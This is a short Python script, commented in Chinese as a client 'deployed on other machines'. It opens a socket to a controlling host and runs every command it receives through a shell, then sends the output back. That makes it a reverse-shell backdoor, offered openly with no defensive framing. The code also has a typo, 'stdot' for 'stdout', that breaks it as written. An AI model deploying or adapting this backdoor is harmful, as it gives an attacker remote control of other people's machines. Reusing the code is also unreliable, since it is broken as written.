# coding: utf-8

__author__ = 'Yemilice_lau'

# 客户端，这个部署在其他机器上

import socket, subprocess

HOST = '127.0.0.1'
PORT = 11443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send("[*] Connect Established")

while 1:
    data = s.recv(1024)
    if data == "quit":
        break
    proc = subprocess.Popen(data, shell=True, stdot=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdou_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdou_value)
s.close()
